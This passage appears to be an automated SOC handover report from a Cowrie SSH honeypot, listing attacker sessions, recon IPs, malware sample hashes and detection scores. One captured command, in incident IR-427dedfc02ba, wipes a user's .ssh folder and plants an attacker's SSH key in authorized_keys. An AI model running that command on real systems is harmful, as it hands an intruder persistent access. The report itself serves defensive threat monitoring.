| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 20:32:02` | `cowrie.session.connect` |
| `2026-05-10 20:32:02` | `cowrie.client.version` |
| `2026-05-10 20:32:02` | `cowrie.client.kex` |
| `2026-05-10 20:32:03` | `cowrie.login.success` |
| `2026-05-10 20:32:03` | `cowrie.session.params` |
| `2026-05-10 20:32:03` | `cowrie.command.input` |
| `2026-05-10 20:32:03` | `cowrie.command.failed` |
| `2026-05-10 20:32:03` | `cowrie.log.closed` |
| `2026-05-10 20:32:03` | `cowrie.session.params` |
| `2026-05-10 20:32:03` | `cowrie.command.input` |
| `2026-05-10 20:32:04` | `cowrie.session.file_download` |
| `2026-05-10 20:32:04` | `cowrie.log.closed` |
| `2026-05-10 20:32:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.247[.]106` to AbuseIPDB if not already reported
- [ ] Block `47.83.247[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b77e73ecc2b

| Field | Detail |
|---|---|
| **Source IP** | `47.83.247[.]106` |
| **First Seen** | 2026-05-10 20:32 |
| **Last Seen** | 2026-05-10 20:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 20:32:05` | `cowrie.session.connect` |
| `2026-05-10 20:32:05` | `cowrie.client.version` |
| `2026-05-10 20:32:05` | `cowrie.client.kex` |
| `2026-05-10 20:32:06` | `cowrie.login.success` |
| `2026-05-10 20:32:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.247[.]106` to AbuseIPDB if not already reported
- [ ] Block `47.83.247[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3a68a58ff5c

| Field | Detail |
|---|---|
| **Source IP** | `43.99.62[.]208` |
| **First Seen** | 2026-05-10 20:37 |
| **Last Seen** | 2026-05-10 20:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 20:37:10` | `cowrie.session.connect` |
| `2026-05-10 20:37:10` | `cowrie.client.version` |
| `2026-05-10 20:37:10` | `cowrie.client.kex` |
| `2026-05-10 20:37:10` | `cowrie.login.success` |
| `2026-05-10 20:37:10` | `cowrie.session.params` |
| `2026-05-10 20:37:10` | `cowrie.command.input` |
| `2026-05-10 20:37:10` | `cowrie.log.closed` |
| `2026-05-10 20:37:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.99.62[.]208` to AbuseIPDB if not already reported
- [ ] Block `43.99.62[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ddf57829251

| Field | Detail |
|---|---|
| **Source IP** | `43.99.62[.]208` |
| **First Seen** | 2026-05-10 20:37 |
| **Last Seen** | 2026-05-10 20:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 20:37:37` | `cowrie.session.connect` |
| `2026-05-10 20:37:37` | `cowrie.client.version` |
| `2026-05-10 20:37:37` | `cowrie.client.kex` |
| `2026-05-10 20:37:37` | `cowrie.login.success` |
| `2026-05-10 20:37:38` | `cowrie.session.params` |
| `2026-05-10 20:37:38` | `cowrie.command.input` |
| `2026-05-10 20:37:38` | `cowrie.log.closed` |
| `2026-05-10 20:37:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.99.62[.]208` to AbuseIPDB if not already reported
- [ ] Block `43.99.62[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-427dedfc02ba

| Field | Detail |
|---|---|
| **Source IP** | `47.83.247[.]106` |
| **First Seen** | 2026-05-10 20:38 |
| **Last Seen** | 2026-05-10 20:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 20:38:58` | `cowrie.session.connect` |
| `2026-05-10 20:38:58` | `cowrie.client.version` |
| `2026-05-10 20:38:58` | `cowrie.client.kex` |
| `2026-05-10 20:38:58` | `cowrie.login.success` |
| `2026-05-10 20:38:58` | `cowrie.session.params` |
| `2026-05-10 20:38:58` | `cowrie.command.input` |
| `2026-05-10 20:38:58` | `cowrie.command.failed` |
| `2026-05-10 20:38:58` | `cowrie.log.closed` |
| `2026-05-10 20:38:59` | `cowrie.session.params` |
| `2026-05-10 20:38:59` | `cowrie.command.input` |
| `2026-05-10 20:38:59` | `cowrie.session.file_download` |
| `2026-05-10 20:38:59` | `cowrie.log.closed` |
| `2026-05-10 20:39:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.247[.]106` to AbuseIPDB if not already reported
- [ ] Block `47.83.247[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1034b68cb46a

| Field | Detail |
|---|---|
| **Source IP** | `47.83.247[.]106` |
| **First Seen** | 2026-05-10 20:39 |
| **Last Seen** | 2026-05-10 20:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 20:39:01` | `cowrie.session.connect` |
| `2026-05-10 20:39:01` | `cowrie.client.version` |
| `2026-05-10 20:39:01` | `cowrie.client.kex` |
| `2026-05-10 20:39:01` | `cowrie.login.success` |
| `2026-05-10 20:39:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.247[.]106` to AbuseIPDB if not already reported
- [ ] Block `47.83.247[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `202.165.15[.]132` | **13** | 2026-05-10 20:35 | 2026-05-10 20:52 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `187.51.208[.]158` | **10** | 2026-05-10 19:11 | 2026-05-10 19:19 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `35.233.209[.]148` | **10** | 2026-05-10 19:26 | 2026-05-10 20:39 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `201.249.205[.]94` | **9** | 2026-05-10 19:13 | 2026-05-10 19:57 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `150.95.25[.]34` | **4** | 2026-05-10 20:23 | 2026-05-10 20:49 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.36.104[.]242` | **2** | 2026-05-10 20:08 | 2026-05-10 20:09 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.47.8[.]188` | **2** | 2026-05-10 20:17 | 2026-05-10 20:38 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `135.148.14[.]151` | **2** | 2026-05-10 20:33 | 2026-05-10 20:37 | 1m | 0 | `T1592` | 🟢 LOW |
| `138.197.147[.]76` | **2** | 2026-05-10 19:25 | 2026-05-10 20:09 | 1m | 0 | `T1592` | 🟢 LOW |
| `113.141.171[.]139` | 1 | 2026-05-10 20:36 | 2026-05-10 20:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.50.199[.]249` | 1 | 2026-05-10 19:27 | 2026-05-10 19:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.203.25[.]201` | 1 | 2026-05-10 19:26 | 2026-05-10 19:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.20[.]170` | 1 | 2026-05-10 20:20 | 2026-05-10 20:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `144.79.187[.]21` | 1 | 2026-05-10 20:14 | 2026-05-10 20:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.119.212[.]99` | 1 | 2026-05-10 20:38 | 2026-05-10 20:38 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `86.246.231[.]52` | 1 | 2026-05-10 20:42 | 2026-05-10 20:44 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `150.95.25[.]34` | TH | ZCOM THAI | **100** ⚠️ | 0 |
| `86.246.231[.]52` | FR | Orange S.A. | **100** ⚠️ | 14 |
| `144.79.187[.]21` | ID | PT Antar Fiber Optik | **100** ⚠️ | 4 |
| `138.197.147[.]76` | CA | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `45.119.212[.]99` | VN | Branch of Long Van System Solution JSC - Hanoi | **100** ⚠️ | 50 |
| `187.51.208[.]158` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |
| `120.203.25[.]201` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `202.165.15[.]132` | MY | TM ONE Cloud Alpha Edge | **100** ⚠️ | 50 |
| `117.50.199[.]249` | CN | Shanghai UCloud Information Technology Company Limited | **100** ⚠️ | 43 |
| `120.48.20[.]170` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 108 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 84 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 19 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 8 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 8 |

---

## 🔕 False Positive Summary (82 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 74 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 162 cases |
| Tool 34  | Credential Extractor        | ✅ 103 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 29 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 82 filtered (50.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 26 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 19 priority case(s) shown individually · 16 recon entry/entries in table (9 group(s) consolidating 54 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-10T20:54:22Z_
